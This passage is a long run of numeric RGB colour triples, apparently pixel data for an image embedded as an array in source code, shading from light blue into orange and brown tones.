.694,0.494,0.345},{0.682,0.467,0.322},{0.671,0.447,0.306},{0.631,0.416,0.263},{0.627,0.416,0.251},
{0.6,0.388,0.212},{0.604,0.373,0.196},{0.588,0.341,0.157},{0.569,0.318,0.133},{0.533,0.275,0.082},{0.51,0.243,0.055},{0.486,0.22,0.047},{0.443,0.184,0.02},{0.333,0.106,0.008},{0.231,0.055,0.008},{0.11,0.012,0.004},{0.09,0.008,0.004},{0.098,0.008,0.004},{0.129,0.016,0.004},{0.188,0.047,0.008},{0.224,0.071,0.008},{0.286,0.094,0.012},{0.467,0.267,0.035},{0.757,0.584,0.137},{0.953,0.827,0.282},{0.996,0.898,0.38},{0.98,0.847,0.271},{0.937,0.769,0.125},{0.898,0.667,0.043},{0.839,0.557,0.012},{0.788,0.451,0.004},{0.761,0.412,0.004},{0.733,0.384,0.004},{0.725,0.384,0},{0.737,0.416,0.004},{0.749,0.451,0.004},{0.769,0.502,0.004},{0.8,0.91,0.996},{0.8,0.91,0.996},{0.812,0.906,1},{0.816,0.906,1},{0.824,0.902,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.827,0.914,1},{0.843,0.914,1},{0.847,0.918,1},{0.851,0.925,0.996},{0.855,0.929,0.996},{0.859,0.929,0.996},{0.863,0.929,1},{0.863,0.925,0.992},{0.863,0.925,0.988},{0.867,0.933,0.996},{0.871,0.937,1},{0.867,0.937,0.996},
{0.882,0.937,1},{0.886,0.937,1},{0.89,0.941,1},{0.894,0.945,1},{0.902,0.949,0.996},{0.918,0.922,0.91},{0.902,0.847,0.78},{0.945,0.922,0.875},{0.914,0.878,0.816},{0.894,0.851,0.78},{0.902,0.824,0.722},{0.992,0.961,0.867},{0.996,0.965,0.886},{0.996,0.957,0.875},{1,0.953,0.871},{0.996,0.949,0.859},{0.996,0.949,0.843},{0.918,0.843,0.784},{0.894,0.788,0.714},{0.898,0.776,0.678},{0.89,0.765,0.651},{0.898,0.757,0.643},{0.886,0.753,0.624},{0.918,0.8,0.69},{0.922,0.808,0.729},{0.894,0.741,0.655},{0.851,0.663,0.553},{0.847,0.643,0.522},{0.847,0.663,0.537},{0.867,0.698,0.584},{0.875,0.729,0.62},{0.871,0.733,0.62},{0.867,0.725,0.608},{0.863,0.722,0.608},{0.847,0.694,0.584},{0.827,0.659,0.557},{0.827,0.647,0.537},{0.824,0.635,0.525},{0.796,0.608,0.475},{0.776,0.584,0.455},{0.765,0.557,0.424},{0.733,0.525,0.392},{0.702,0.498,0.345},{0.698,0.475,0.329},{0.675,0.455,0.314},{0.655,0.439,0.286},{0.647,0.435,0.267},{0.624,0.416,0.227},{0.62,0.392,0.212},{0.608,0.361,0.176},{0.588,0.341,0.153},{0.561,0.302,0.102},{0.533,0.259,0.063},
{0.502,0.227,0.047},{0.439,0.184,0.027},{0.314,0.094,0.008},{0.176,0.035,0.004},{0.051,0,0},{0.039,0.004,0.004},{0.043,0,0.004},{0.059,0.008,0.004},{0.106,0.016,0.004},{0.271,0.122,0.02},{0.596,0.416,0.051},{0.847,0.686,0.149},{0.965,0.851,0.302},{0.973,0.878,0.329},{0.945,0.788,0.188},{0.91,0.698,0.055},{0.867,0.604,0.027},{0.804,0.475,0.012},{0.749,0.376,0.004},{0.714,0.349,0.004},{0.702,0.357,0.004},{0.698,0.384,0.004},{0.725,0.435,0.004},{0.784,0.518,0.016},{0.859,0.659,0.055},{0.898,0.745,0.102},{0.792,0.906,0.992},{0.792,0.906,0.992},{0.8,0.91,1},{0.804,0.906,1},{0.82,0.906,1},{0.824,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.91,1},{0.827,0.914,1},{0.839,0.914,1},{0.839,0.914,1},{0.847,0.922,0.992},{0.851,0.925,0.996},{0.859,0.925,0.996},{0.859,0.925,0.996},{0.863,0.925,0.992},{0.863,0.925,0.992},{0.863,0.925,0.992},{0.867,0.933,0.996},{0.867,0.937,0.996},{0.878,0.937,1},{0.882,0.937,1},{0.886,0.937,1},{0.894,0.937,1},{0.906,0.953,0.996},{0.902,0.89,0.859},
{0.918,0.859,0.796},{0.945,0.925,0.867},{0.898,0.859,0.796},{0.894,0.847,0.769},{0.929,0.859,0.757},{0.996,0.969,0.875},{1,0.969,0.894},{1,0.965,0.898},{0.996,0.957,0.882},{1,0.961,0.875},{0.992,0.937,0.847},{0.925,0.843,0.788},{0.906,0.804,0.729},{0.906,0.788,0.69},{0.902,0.776,0.667},{0.902,0.765,0.655},{0.898,0.761,0.62},{0.875,0.745,0.592},{0.945,0.855,0.627},{0.925,0.804,0.608},{0.886,0.733,0.635},{0.886,0.71,0.612},{0.882,0.722,0.608},{0.886,0.741,0.62},{0.886,0.745,0.635},{0.89,0.753,0.639},{0.878,0.741,0.624},{0.878,0.737,0.624},{0.863,0.71,0.6},{0.847,0.686,0.58},{0.831,0.663,0.549},{0.812,0.635,0.522},{0.808,0.624,0.494},{0.788,0.596,0.467},{0.773,0.569,0.439},{0.757,0.549,0.408},{0.725,0.514,0.365},{0.702,0.478,0.333},{0.678,0.459,0.314},{0.667,0.447,0.294},{0.667,0.447,0.286},{0.639,0.42,0.243},{0.635,0.404,0.227},{0.631,0.388,0.2},{0.604,0.361,0.153},{0.58,0.329,0.114},{0.549,0.278,0.063},{0.506,0.235,0.035},{0.42,0.173,0.027},{0.275,0.063,0.004},{0.11,0.012,0.004},{0.008,0,0},{0.004,0,0.004},
{0.008,0.004,0},{0.09,0.039,0.004},{0.392,0.243,0.035},{0.722,0.545,0.09},{0.894,0.757,0.2},{0.965,0.839,0.29},{0.957,0.8,0.235},{0.898,0.706,0.098},{0.871,0.627,0.027},{0.812,0.51,0.004},{0.745,0.388,0.004},{0.71,0.322,0.004},{0.694,0.314,0.004},{0.686,0.333,0.004},{0.714,0.396,0.004},{0.788,0.506,0.012},{0.859,0.651,0.051},{0.925,0.776,0.137},{0.961,0.824,0.22},{0.976,0.851,0.29},{0.796,0.906,1},{0.796,0.906,1},{0.792,0.914,0.996},{0.804,0.906,1},{0.82,0.906,1},{0.82,0.906,1},{0.824,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.831,0.918,1},{0.847,0.918,1},{0.847,0.918,1},{0.859,0.925,1},{0.859,0.925,0.996},{0.859,0.925,0.996},{0.859,0.925,0.996},{0.859,0.925,0.992},{0.867,0.933,0.996},{0.867,0.933,0.996},{0.871,0.937,1},{0.875,0.941,1},{0.882,0.941,1},{0.894,0.937,0.996},{0.902,0.945,0.992},{0.906,0.878,0.824},{0.918,0.89,0.82},{0.937,0.91,0.847},{0.878,0.82,0.749},{0.882,0.827,0.737},{0.937,0.878,0.773},{0.996,0.969,0.871},
{1,0.969,0.89},{0.996,0.965,0.894},{1,0.973,0.894},{0.996,0.969,0.882},{0.996,0.961,0.867},{0.929,0.855,0.796},{0.918,0.812,0.745},{0.914,0.796,0.706},{0.91,0.784,0.69},{0.902,0.773,0.675},{0.894,0.761,0.647},{0.894,0.753,0.624},{0.89,0.769,0.616},{0.969,0.886,0.49},{0.965,0.82,0.561},{0.929,0.804,0.71},{0.914,0.78,0.698},{0.91,0.773,0.675},{0.902,0.765,0.667},{0.902,0.765,0.663},{0.894,0.761,0.655},{0.886,0.749,0.639},{0.871,0.729,0.616},{0.855,0.71,0.596},{0.839,0.678,0.565},{0.831,0.655,0.541},{0.812,0.647,0.522},{0.784,0.6,0.482},{0.776,0.58,0.451},{0.765,0.561,0.416},{0.753,0.549,0.396},{0.725,0.522,0.369},{0.698,0.482,0.329},{0.678,0.451,0.294},{0.671,0.439,0.282},{0.671,0.439,0.278},{0.663,0.424,0.247},{0.639,0.4,0.208},{0.627,0.373,0.165},{0.604,0.353,0.129},{0.553,0.294,0.067},{0.51,0.239,0.043},{0.373,0.125,0.012},{0.208,0.035,0.004},{0.043,0.008,0.004},{0.035,0.008,0.004},{0.114,0.035,0.004},{0.31,0.188,0.02},{0.612,0.435,0.043},{0.804,0.627,0.086},{0.89,0.761,0.212},{0.925,0.773,0.239},{0.875,0.667,0.102},
{0.835,0.573,0.031},{0.792,0.475,0.004},{0.741,0.388,0.004},{0.682,0.298,0.004},{0.678,0.278,0.004},{0.678,0.318,0.004},{0.714,0.392,0.008},{0.792,0.518,0.024},{0.886,0.659,0.067},{0.925,0.741,0.118},{0.949,0.808,0.2},{0.957,0.831,0.243},{0.929,0.808,0.227},{0.918,0.788,0.204},{0.796,0.906,1},{0.796,0.906,1},{0.792,0.914,0.996},{0.804,0.906,1},{0.82,0.906,1},{0.82,0.906,1},{0.827,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.847,0.918,1},{0.851,0.922,1},{0.855,0.922,0.996},{0.859,0.925,0.996},{0.863,0.929,0.992},{0.867,0.933,0.996},{0.863,0.929,0.992},{0.867,0.933,0.996},{0.867,0.933,0.996},{0.867,0.933,0.996},{0.871,0.941,1},{0.882,0.941,1},{0.886,0.949,0.996},{0.906,0.945,0.984},{0.882,0.855,0.784},{0.925,0.898,0.827},{0.933,0.902,0.831},{0.863,0.796,0.714},{0.875,0.816,0.71},{0.961,0.906,0.8},{0.996,0.965,0.89},{0.996,0.965,0.867},{0.988,0.961,0.859},{0.996,0.965,0.886},{0.996,0.969,0.902},{0.996,0.961,0.882},{0.949,0.878,0.82},
{0.929,0.827,0.753},{0.925,0.804,0.722},{0.922,0.796,0.718},{0.914,0.788,0.702},{0.898,0.773,0.671},{0.894,0.765,0.651},{0.902,0.757,0.635},{0.906,0.792,0.612},{0.976,0.89,0.467},{0.953,0.843,0.647},{0.941,0.827,0.773},{0.929,0.812,0.733},{0.925,0.8,0.714},{0.91,0.78,0.69},{0.902,0.773,0.675},{0.886,0.753,0.651},{0.882,0.745,0.627},{0.863,0.718,0.604},{0.851,0.69,0.569},{0.839,0.667,0.553},{0.827,0.659,0.533},{0.808,0.624,0.502},{0.78,0.588,0.459},{0.784,0.58,0.439},{0.757,0.549,0.416},{0.733,0.525,0.388},{0.722,0.506,0.353},{0.706,0.475,0.322},{0.682,0.451,0.294},{0.682,0.451,0.294},{0.675,0.435,0.263},{0.659,0.424,0.231},{0.651,0.404,0.192},{0.616,0.369,0.145},{0.557,0.306,0.09},{0.467,0.204,0.059},{0.275,0.075,0.004},{0.125,0.012,0.004},{0.157,0.043,0.008},{0.345,0.169,0.016},{0.525,0.31,0.012},{0.698,0.49,0.024},{0.804,0.651,0.106},{0.855,0.706,0.165},{0.831,0.631,0.102},{0.796,0.486,0.027},{0.749,0.392,0.004},{0.698,0.314,0.004},{0.651,0.247,0.004},{0.647,0.259,0.004},{0.675,0.325,0.008},{0.749,0.439,0.016},{0.824,0.58,0.031},
{0.886,0.682,0.063},{0.922,0.745,0.11},{0.929,0.776,0.169},{0.941,0.808,0.22},{0.949,0.827,0.259},{0.937,0.808,0.251},{0.898,0.749,0.173},{0.875,0.706,0.106},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.792,0.906,0.996},{0.796,0.906,1},{0.816,0.906,1},{0.827,0.906,1},{0.824,0.906,1},{0.824,0.902,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.843,0.918,1},{0.847,0.918,1},{0.851,0.922,0.992},{0.855,0.925,0.992},{0.859,0.929,0.996},{0.863,0.929,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.867,0.933,0.996},{0.867,0.933,0.996},{0.875,0.933,0.996},{0.882,0.933,1},{0.89,0.945,0.996},{0.902,0.941,0.973},{0.878,0.839,0.761},{0.945,0.91,0.851},{0.925,0.875,0.812},{0.859,0.796,0.694},{0.863,0.804,0.69},{0.98,0.933,0.824},{0.996,0.965,0.894},{1,0.961,0.875},{0.992,0.961,0.847},{1,0.969,0.878},{1,0.973,0.906},{0.996,0.969,0.894},{0.965,0.906,0.847},{0.941,0.843,0.78},{0.941,0.82,0.753},{0.925,0.812,0.733},{0.914,0.796,0.718},{0.914,0.788,0.698},{0.906,0.784,0.678},
{0.918,0.78,0.659},{0.914,0.78,0.647},{0.933,0.851,0.612},{0.969,0.867,0.412},{0.961,0.835,0.663},{0.945,0.839,0.773},{0.933,0.812,0.749},{0.922,0.8,0.714},{0.914,0.788,0.698},{0.902,0.773,0.667},{0.894,0.757,0.647},{0.878,0.741,0.624},{0.871,0.718,0.608},{0.855,0.686,0.58},{0.835,0.671,0.553},{0.824,0.639,0.529},{0.78,0.588,0.459},{0.769,0.58,0.431},{0.765,0.573,0.427},{0.745,0.553,0.412},{0.737,0.533,0.38},{0.722,0.506,0.341},{0.686,0.467,0.31},{0.682,0.467,0.298},{0.686,0.459,0.275},{0.678,0.439,0.239},{0.667,0.42,0.196},{0.62,0.376,0.149},{0.533,0.282,0.086},{0.333,0.11,0.024},{0.192,0.035,0.008},{0.29,0.125,0.008},{0.486,0.255,0.012},{0.62,0.392,0.004},{0.722,0.502,0.027},{0.765,0.557,0.047},{0.769,0.51,0.043},{0.737,0.404,0.008},{0.71,0.345,0.008},{0.682,0.314,0.008},{0.675,0.314,0.012},{0.737,0.424,0.027},{0.784,0.502,0.024},{0.831,0.58,0.024},{0.871,0.655,0.047},{0.89,0.702,0.067},{0.894,0.714,0.078},{0.898,0.729,0.098},{0.91,0.757,0.125},{0.914,0.776,0.169},{0.937,0.812,0.235},{0.957,0.835,0.278},{0.929,0.8,0.243},
{0.89,0.741,0.165},{0.855,0.694,0.098},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.792,0.906,0.996},{0.804,0.906,1},{0.82,0.906,1},{0.824,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.839,0.914,1},{0.843,0.914,1},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.859,0.925,0.996},{0.859,0.925,0.996},{0.859,0.925,0.992},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.867,0.933,0.996},{0.871,0.933,0.996},{0.875,0.937,1},{0.882,0.941,1},{0.91,0.937,0.957},{0.882,0.827,0.749},{0.953,0.918,0.859},{0.922,0.867,0.784},{0.867,0.796,0.678},{0.875,0.812,0.69},{0.996,0.953,0.855},{0.996,0.969,0.89},{1,0.961,0.875},{0.996,0.965,0.867},{1,0.969,0.89},{1,0.969,0.898},{1,0.969,0.898},{0.984,0.933,0.875},{0.945,0.859,0.804},{0.953,0.835,0.784},{0.941,0.824,0.757},{0.925,0.808,0.729},{0.918,0.792,0.706},{0.914,0.788,0.69},{0.918,0.792,0.678},{0.929,0.788,0.671},{0.918,0.788,0.663},{0.945,0.871,0.592},{0.973,0.851,0.369},{0.953,0.804,0.616},
{0.949,0.831,0.776},{0.929,0.812,0.729},{0.922,0.796,0.718},{0.906,0.776,0.686},{0.906,0.765,0.671},{0.886,0.749,0.639},{0.867,0.718,0.608},{0.859,0.694,0.588},{0.847,0.678,0.565},{0.831,0.647,0.537},{0.796,0.608,0.478},{0.788,0.6,0.451},{0.776,0.588,0.439},{0.769,0.58,0.431},{0.753,0.557,0.4},{0.741,0.529,0.365},{0.718,0.502,0.333},{0.698,0.486,0.302},{0.698,0.478,0.278},{0.69,0.455,0.239},{0.678,0.443,0.216},{0.612,0.373,0.161},{0.376,0.137,0.055},{0.282,0.051,0.012},{0.443,0.184,0.008},{0.573,0.31,0.004},{0.643,0.384,0.008},{0.671,0.424,0.004},{0.69,0.443,0.012},{0.725,0.447,0.02},{0.745,0.467,0.024},{0.773,0.506,0.031},{0.804,0.565,0.051},{0.835,0.616,0.051},{0.867,0.659,0.075},{0.886,0.694,0.09},{0.898,0.722,0.114},{0.886,0.733,0.11},{0.898,0.733,0.122},{0.902,0.745,0.133},{0.902,0.745,0.129},{0.91,0.761,0.141},{0.918,0.78,0.165},{0.929,0.804,0.2},{0.941,0.824,0.239},{0.961,0.843,0.278},{0.937,0.816,0.251},{0.91,0.773,0.196},{0.875,0.729,0.141},{0.788,0.898,0.992},{0.788,0.898,0.992},{0.792,0.902,0.996},{0.792,0.902,0.996},
{0.796,0.906,0.996},{0.808,0.906,1},{0.824,0.906,1},{0.824,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.91,1},{0.827,0.914,1},{0.835,0.914,1},{0.835,0.914,1},{0.847,0.922,0.996},{0.847,0.922,0.996},{0.855,0.925,0.996},{0.859,0.929,0.996},{0.859,0.925,0.992},{0.859,0.925,0.992},{0.859,0.925,0.988},{0.867,0.933,0.996},{0.871,0.933,0.996},{0.871,0.937,1},{0.875,0.941,1},{0.914,0.918,0.925},{0.89,0.827,0.753},{0.945,0.918,0.855},{0.902,0.847,0.753},{0.855,0.776,0.659},{0.882,0.82,0.694},{1,0.965,0.875},{0.996,0.965,0.882},{1,0.965,0.878},{0.996,0.961,0.875},{0.992,0.957,0.882},{1,0.965,0.89},{0.996,0.965,0.894},{0.996,0.953,0.894},{0.961,0.886,0.839},{0.965,0.851,0.808},{0.949,0.835,0.776},{0.937,0.816,0.749},{0.929,0.804,0.722},{0.922,0.8,0.706},{0.918,0.8,0.702},{0.918,0.804,0.702},{0.925,0.792,0.694},{0.918,0.796,0.686},{0.957,0.875,0.58},{0.961,0.816,0.298},{0.945,0.749,0.463},{0.957,0.812,0.757},{0.929,0.804,0.729},{0.914,0.788,0.698},{0.914,0.769,0.682},{0.902,0.765,0.663},
{0.886,0.737,0.635},{0.863,0.698,0.592},{0.851,0.686,0.573},{0.843,0.671,0.557},{0.827,0.647,0.514},{0.808,0.62,0.478},{0.796,0.608,0.463},{0.776,0.588,0.439},{0.769,0.573,0.416},{0.761,0.549,0.384},{0.753,0.541,0.365},{0.741,0.525,0.333},{0.733,0.51,0.298},{0.714,0.482,0.247},{0.647,0.424,0.192},{0.51,0.275,0.051},{0.518,0.298,0.031},{0.671,0.463,0.043},{0.773,0.588,0.078},{0.827,0.643,0.11},{0.835,0.651,0.106},{0.855,0.671,0.11},{0.859,0.694,0.133},{0.886,0.725,0.145},{0.902,0.733,0.169},{0.89,0.733,0.157},{0.902,0.753,0.173},{0.898,0.757,0.18},{0.902,0.769,0.188},{0.918,0.776,0.188},{0.929,0.78,0.188},{0.929,0.788,0.2},{0.922,0.784,0.208},{0.922,0.792,0.208},{0.933,0.804,0.22},{0.941,0.816,0.231},{0.961,0.831,0.275},{0.957,0.839,0.278},{0.957,0.843,0.278},{0.961,0.839,0.278},{0.945,0.827,0.259},{0.922,0.8,0.224},{0.898,0.765,0.18},{0.788,0.898,0.992},{0.788,0.898,0.992},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.796,0.902,0.996},{0.808,0.902,1},{0.82,0.906,1},{0.82,0.906,1},{0.827,0.906,1},{0.827,0.906,1},
{0.827,0.91,1},{0.827,0.914,1},{0.827,0.914,1},{0.827,0.914,1},{0.839,0.922,1},{0.843,0.925,1},{0.851,0.925,0.996},{0.855,0.929,0.996},{0.859,0.929,0.996},{0.859,0.925,0.996},{0.863,0.925,0.992},{0.871,0.933,0.996},{0.871,0.933,0.996},{0.871,0.933,0.996},{0.871,0.933,0.992},{0.91,0.902,0.882},{0.886,0.831,0.757},{0.937,0.91,0.851},{0.875,0.82,0.714},{0.843,0.776,0.667},{0.914,0.855,0.737},{1,0.976,0.894},{1,0.969,0.894},{1,0.953,0.871},{0.996,0.957,0.867},{1,0.961,0.882},{0.996,0.957,0.878},{0.996,0.965,0.882},{0.992,0.961,0.882},{0.988,0.929,0.875},{0.961,0.871,0.827},{0.957,0.851,0.8},{0.941,0.824,0.769},{0.937,0.816,0.745},{0.933,0.816,0.733},{0.918,0.808,0.722},{0.925,0.808,0.725},{0.929,0.804,0.718},{0.925,0.8,0.71},{0.918,0.784,0.698},{0.945,0.839,0.596},{0.957,0.855,0.392},{0.925,0.784,0.376},{0.941,0.804,0.655},{0.922,0.796,0.733},{0.902,0.776,0.698},{0.894,0.765,0.667},{0.89,0.749,0.639},{0.875,0.718,0.604},{0.851,0.698,0.588},{0.835,0.682,0.573},{0.82,0.643,0.522},{0.824,0.635,0.518},
{0.812,0.627,0.494},{0.792,0.604,0.455},{0.78,0.584,0.427},{0.776,0.569,0.404},{0.761,0.557,0.361},{0.753,0.537,0.333},{0.722,0.514,0.267},{0.576,0.341,0.165},{0.537,0.298,0.035},{0.749,0.533,0.043},{0.855,0.667,0.141},{0.918,0.765,0.22},{0.957,0.839,0.29},{0.98,0.875,0.337},{0.984,0.882,0.369},{0.969,0.867,0.325},{0.965,0.859,0.306},{0.965,0.855,0.306},{0.969,0.855,0.302},{0.976,0.859,0.306},{0.976,0.867,0.318},{0.969,0.863,0.31},{0.973,0.859,0.318},{0.969,0.859,0.306},{0.961,0.843,0.286},{0.965,0.847,0.286},{0.961,0.851,0.286},{0.957,0.851,0.278},{0.949,0.847,0.278},{0.965,0.855,0.306},{0.973,0.859,0.329},{0.973,0.859,0.318},{0.98,0.859,0.318},{0.969,0.847,0.286},{0.957,0.835,0.263},{0.937,0.82,0.251},{0.922,0.796,0.216},{0.788,0.898,0.992},{0.788,0.898,0.992},{0.788,0.898,0.992},{0.792,0.902,0.996},{0.796,0.902,0.996},{0.804,0.898,1},{0.816,0.902,0.996},{0.824,0.91,1},{0.827,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.824,0.91,1},{0.827,0.914,1},{0.827,0.922,1},{0.831,0.929,1},
{0.843,0.925,0.992},{0.851,0.925,0.992},{0.855,0.925,0.992},{0.859,0.925,0.996},{0.867,0.929,0.996},{0.867,0.929,0.992},{0.867,0.929,0.992},{0.867,0.929,0.992},{0.867,0.933,0.992},{0.855,0.855,0.812},{0.871,0.827,0.749},{0.929,0.898,0.839},{0.871,0.804,0.706},{0.843,0.776,0.667},{0.922,0.871,0.761},{1,0.988,0.91},{1,0.973,0.898},{0.996,0.953,0.871},{1,0.957,0.867},{1,0.957,0.878},{0.996,0.953,0.867},{1,0.957,0.867},{1,0.961,0.871},{0.996,0.957,0.882},{0.969,0.91,0.859},{0.957,0.863,0.82},{0.953,0.843,0.792},{0.941,0.831,0.773},{0.933,0.824,0.745},{0.929,0.82,0.733},{0.925,0.816,0.729},{0.918,0.804,0.718},{0.918,0.796,0.71},{0.918,0.788,0.69},{0.906,0.78,0.643},{0.906,0.78,0.631},{0.929,0.851,0.596},{0.961,0.898,0.486},{0.937,0.835,0.498},{0.922,0.792,0.584},{0.91,0.769,0.671},{0.886,0.749,0.659},{0.886,0.741,0.639},{0.867,0.714,0.608},{0.851,0.694,0.584},{0.843,0.663,0.557},{0.831,0.643,0.541},{0.82,0.639,0.506},{0.808,0.62,0.475},{0.804,0.608,0.451},{0.784,0.573,0.412},{0.753,0.522,0.337},{0.647,0.412,0.188},
{0.596,0.361,0.067},{0.643,0.408,0.02},{0.761,0.549,0.039},{0.835,0.651,0.106},{0.902,0.765,0.208},{0.933,0.824,0.278},{0.969,0.871,0.353},{0.992,0.906,0.404},{0.992,0.925,0.455},{1,0.937,0.467},{1,0.922,0.431},{0.996,0.918,0.424},{0.996,0.906,0.408},{0.996,0.902,0.404},{0.992,0.898,0.392},{0.996,0.902,0.396},{0.996,0.902,0.4},{0.996,0.902,0.384},{0.992,0.894,0.384},{0.992,0.886,0.38},{0.984,0.89,0.369},{0.976,0.882,0.357},{0.988,0.89,0.361},{0.984,0.882,0.365},{0.984,0.871,0.349},{0.984,0.871,0.325},{0.976,0.859,0.306},{0.976,0.855,0.302},{0.969,0.851,0.282},{0.961,0.843,0.271},{0.945,0.827,0.259},{0.78,0.902,1},{0.78,0.902,1},{0.788,0.898,0.992},{0.788,0.902,0.996},{0.792,0.902,1},{0.8,0.906,0.996},{0.804,0.902,1},{0.82,0.906,1},{0.824,0.902,1},{0.824,0.902,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.91,1},{0.835,0.918,1},{0.835,0.922,1},{0.847,0.922,1},{0.855,0.922,1},{0.859,0.922,0.996},{0.859,0.925,0.996},{0.863,0.929,0.996},{0.863,0.929,0.992},
{0.863,0.929,0.992},{0.863,0.929,0.992},{0.867,0.933,0.984},{0.875,0.867,0.808},{0.89,0.855,0.776},{0.898,0.867,0.8},{0.827,0.761,0.647},{0.82,0.753,0.639},{0.933,0.89,0.792},{1,0.98,0.922},{1,0.976,0.91},{0.992,0.949,0.875},{0.992,0.957,0.867},{0.996,0.961,0.871},{0.996,0.949,0.863},{1,0.953,0.863},{1,0.957,0.871},{1,0.957,0.871},{0.992,0.953,0.875},{0.961,0.898,0.847},{0.953,0.859,0.816},{0.945,0.847,0.788},{0.945,0.831,0.769},{0.945,0.831,0.753},{0.929,0.82,0.733},{0.922,0.812,0.725},{0.922,0.808,0.722},{0.922,0.804,0.71},{0.906,0.788,0.686},{0.898,0.773,0.655},{0.906,0.765,0.643},{0.898,0.765,0.62},{0.937,0.847,0.561},{0.969,0.89,0.486},{0.945,0.843,0.451},{0.922,0.788,0.471},{0.914,0.749,0.533},{0.898,0.733,0.565},{0.882,0.718,0.588},{0.875,0.69,0.561},{0.867,0.659,0.537},{0.831,0.612,0.482},{0.8,0.533,0.416},{0.733,0.447,0.282},{0.655,0.392,0.122},{0.635,0.388,0.024},{0.729,0.518,0.024},{0.847,0.659,0.114},{0.906,0.745,0.173},{0.933,0.8,0.231},{0.953,0.843,0.302},{0.976,0.878,0.341},{0.98,0.89,0.388},
{0.988,0.894,0.392},{0.996,0.91,0.431},{0.996,0.922,0.443},{1,0.925,0.447},{0.996,0.922,0.443},{0.992,0.914,0.435},{0.992,0.922,0.427},{0.992,0.906,0.431},{0.996,0.902,0.427},{0.992,0.914,0.435},{0.992,0.91,0.42},{0.992,0.91,0.416},{0.996,0.906,0.408},{0.988,0.894,0.4},{0.98,0.894,0.365},{0.988,0.89,0.373},{0.988,0.89,0.373},{0.988,0.89,0.373},{0.992,0.878,0.353},{0.98,0.867,0.329},{0.984,0.871,0.325},{0.976,0.859,0.318},{0.976,0.855,0.31},{0.969,0.847,0.29},{0.969,0.847,0.286},{0.776,0.898,1},{0.776,0.898,1},{0.788,0.898,0.996},{0.788,0.898,0.992},{0.792,0.902,1},{0.796,0.906,0.996},{0.8,0.902,1},{0.82,0.906,1},{0.824,0.902,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.831,0.914,1},{0.831,0.918,1},{0.839,0.922,1},{0.847,0.922,1},{0.855,0.922,0.992},{0.859,0.925,0.996},{0.859,0.925,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.867,0.933,0.996},{0.882,0.937,0.98},{0.89,0.867,0.792},{0.925,0.898,0.824},{0.925,0.894,0.827},
{0.843,0.776,0.663},{0.847,0.78,0.667},{0.961,0.918,0.824},{1,0.976,0.925},{1,0.976,0.918},{0.996,0.965,0.894},{0.988,0.957,0.871},{0.996,0.957,0.867},{0.992,0.945,0.859},{1,0.953,0.867},{1,0.953,0.867},{1,0.957,0.871},{0.992,0.945,0.863},{0.992,0.949,0.882},{0.957,0.89,0.843},{0.953,0.863,0.812},{0.949,0.847,0.788},{0.953,0.831,0.769},{0.941,0.827,0.749},{0.929,0.816,0.741},{0.925,0.812,0.733},{0.922,0.812,0.729},{0.914,0.8,0.71},{0.91,0.784,0.682},{0.914,0.776,0.671},{0.894,0.761,0.647},{0.89,0.753,0.627},{0.878,0.745,0.557},{0.922,0.808,0.541},{0.953,0.863,0.494},{0.973,0.886,0.416},{0.953,0.82,0.353},{0.925,0.765,0.29},{0.902,0.702,0.22},{0.843,0.608,0.137},{0.773,0.471,0.051},{0.725,0.361,0.024},{0.702,0.31,0.02},{0.69,0.318,0.012},{0.722,0.373,0.008},{0.745,0.443,0.02},{0.796,0.514,0.063},{0.843,0.588,0.122},{0.886,0.667,0.192},{0.918,0.733,0.251},{0.933,0.784,0.294},{0.953,0.816,0.329},{0.969,0.816,0.337},{0.965,0.827,0.333},{0.969,0.827,0.337},{0.973,0.827,0.341},{0.961,0.808,0.318},{0.937,0.784,0.298},
{0.945,0.8,0.337},{0.933,0.773,0.333},{0.929,0.769,0.318},{0.937,0.792,0.333},{0.941,0.788,0.333},{0.945,0.788,0.337},{0.949,0.808,0.341},{0.945,0.812,0.322},{0.953,0.824,0.306},{0.969,0.839,0.333},{0.973,0.851,0.341},{0.961,0.839,0.325},{0.957,0.839,0.333},{0.949,0.835,0.318},{0.949,0.835,0.31},{0.945,0.824,0.302},{0.941,0.82,0.282},{0.929,0.808,0.251},{0.937,0.808,0.239},{0.773,0.894,1},{0.773,0.894,1},{0.788,0.898,0.996},{0.788,0.898,0.996},{0.788,0.898,0.996},{0.792,0.902,0.992},{0.8,0.902,1},{0.816,0.906,1},{0.824,0.906,1},{0.824,0.906,1},{0.824,0.906,1},{0.827,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.914,1},{0.827,0.91,1},{0.827,0.922,1},{0.843,0.922,1},{0.851,0.922,0.992},{0.855,0.925,0.996},{0.859,0.929,0.996},{0.863,0.929,0.996},{0.863,0.929,0.992},{0.867,0.933,0.996},{0.894,0.937,0.98},{0.89,0.851,0.769},{0.933,0.91,0.843},{0.918,0.882,0.808},{0.859,0.788,0.675},{0.851,0.788,0.678},{0.976,0.945,0.847},{1,0.98,0.925},{1,0.98,0.918},{0.996,0.969,0.91},
